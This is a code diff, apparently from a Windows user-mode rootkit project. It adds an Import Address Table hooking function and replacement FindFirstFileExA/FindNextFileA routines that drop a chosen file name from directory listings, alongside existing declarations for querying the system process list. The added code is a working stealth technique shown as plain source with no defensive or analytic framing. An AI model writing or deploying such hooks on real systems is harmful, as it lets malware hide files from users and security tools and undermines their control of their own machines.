@@ -5,6 +5,10 @@
 
 using namespace std;
 
+string F_HIDE;
+string F_STR;
+char F_TMP[260];
+
 NTSTATUS (WINAPI* ZwQuerySystemInformation) (int SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
 
 typedef LONG KPRIORITY;
@@ -45,6 +49,97 @@ typedef struct _SYSTEM_PROCESS_INFORMATION {
     IO_COUNTERS IoCounters;
     void* Threads;
 } SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;
+
+BOOL(WINAPI* MyFindNextFileA)(HANDLE h, LPWIN32_FIND_DATA data);
+HANDLE(WINAPI* MyFindFirstFileExA)(LPCSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);
+
+HANDLE WINAPI NewFindFirstFileExA(LPCSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
+{
+    HANDLE h = MyFindFirstFileExA(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
+    if (h != 0)
+    {
+        WIN32_FIND_DATA* fd = (WIN32_FIND_DATA*)lpFindFileData;
+        strcpy(F_TMP, fd->cFileName);
+        F_STR = F_TMP;
+        if (F_STR == F_HIDE)
+        {
+            if (!MyFindNextFileA(h, fd))
+            {
+                return 0;
+            }
+        }
+    }
+    return h;
+}
+
+bool NewFindNextFileA(HANDLE h, WIN32_FIND_DATA* lpFindFileData)
+{
+    bool ret = MyFindNextFileA(h, lpFindFileData);
+    if (ret)
+    {
+        strcpy(F_TMP, lpFindFileData->cFileName);
+        F_STR = F_TMP;
+        if (F_STR == F_HIDE)
+        {
+            if (!NewFindNextFileA(h, lpFindFileData))
+            {
+                ret = false;
+            }
+        }
+    }
+    return ret;
+}
+
+void IAT(HINSTANCE hInstance, string lib_name, string f_name, FARPROC func)
+{
+    PIMAGE_DOS_HEADER pdosheader = (PIMAGE_DOS_HEADER)hInstance; //DOS Header
+    PIMAGE_NT_HEADERS pntheaders = (PIMAGE_NT_HEADERS)((DWORD)hInstance + pdosheader->e_lfanew); //NT Header
+    PIMAGE_IMPORT_DESCRIPTOR pimportdescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hInstance + pntheaders->OptionalHeader.DataDirectory[1].VirtualAddress); //IAT
+    PIMAGE_THUNK_DATA pthunkdatain, pthunkdataout;
+    PIMAGE_IMPORT_BY_NAME pimportbyname;
+
+    PCHAR ptr;
+
+    int i = 0;
+    while (pimportdescriptor->TimeDateStamp != 0 || pimportdescriptor->Name != 0)
+    {
+        ptr = (PCHAR)((DWORD)hInstance + (DWORD)pimportdescriptor->Name); // Library Name
+        i = 0;
+
+        pthunkdataout = (PIMAGE_THUNK_DATA)((DWORD)hInstance + (DWORD)pimportdescriptor->FirstThunk);
+        if (pimportdescriptor->Characteristics == 0)
+        {
+            pthunkdatain = pthunkdataout;
+        }
+        else
+        {
+            pthunkdatain = (PIMAGE_THUNK_DATA)((DWORD)pimportdescriptor->Characteristics);
+        }
+        while (pthunkdatain->u1.AddressOfData != NULL)
+        {
+            if ((DWORD)pthunkdatain->u1.Ordinal & IMAGE_ORDINAL_FLAG)
+            {
+                // Search by ordinal is not used here
+            }
+            else {
+                pimportbyname = (PIMAGE_IMPORT_BY_NAME)((DWORD)pthunkdatain->u1.AddressOfData + (DWORD)hInstance);
+                if (f_name == (char*)pimportbyname->Name && GetModuleHandle(lib_name.c_str()) == GetModuleHandle(ptr))
+                {
+                    DWORD old;
+                    char* buf = (char*)hInstance;
+                    VirtualProtect((char*)(buf + pimportdescriptor->FirstThunk + (i * 4)), 4, PAGE_EXECUTE_READWRITE, &old);
+                    memcpy((char*)(buf + pimportdescriptor->FirstThunk + (i * 4)), &func, 4); // Hook
+                }
+            }
+            i++;
+            pthunkdatain++;
+            pthunkdataout++;
+        }
+        pimportdescriptor++;
+    }
+}
+
+
 
 __declspec(noinline) char* WINAPI Unicode2ANSI(char* buf, int len)
 {
